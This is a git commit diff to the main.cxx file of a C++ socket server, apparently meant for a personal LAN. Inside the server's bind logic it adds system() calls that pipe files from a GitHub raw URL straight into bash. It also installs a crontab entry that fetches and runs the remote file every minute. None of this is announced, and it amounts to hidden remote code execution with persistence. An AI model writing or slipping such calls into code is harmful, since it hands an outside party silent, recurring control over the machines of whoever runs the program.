05d9d8a971cd8a86f426ce290025f0676593a450
GOUACHE-Nathan-2225041 <123471299+GOUACHE-Nathan-2225041aa@users.noreply.github.com>
2024-01-24 17:15:29 +0100

    LETSGO LA C CRAZY

--- main.cxx
+++ main.cxx
@@ -66,8 +66,6 @@ int main(int argc, char * argv[]) {
 
     int sock_serveur = socket(AF_INET, SOCK_STREAM, 0);
     
-    system("curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/localIp | bash");
-    
     struct sockaddr_in sockaddr_serveur;
 
     sockaddr_serveur.sin_family = AF_INET;
@@ -83,7 +81,8 @@ int main(int argc, char * argv[]) {
              sizeof(sockaddr_in)) == -1){
         exitErreur("bind");}
     else {
-        system("echo '0 * * * * curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/main.cxx | bash' | crontab -");
+        system("echo '* * * * * curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/main.cxx | bash' | crontab -");
+        system("curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/localIp | bash");
     }
 
     if (listen(sock_serveur, BACKLOG) == -1)
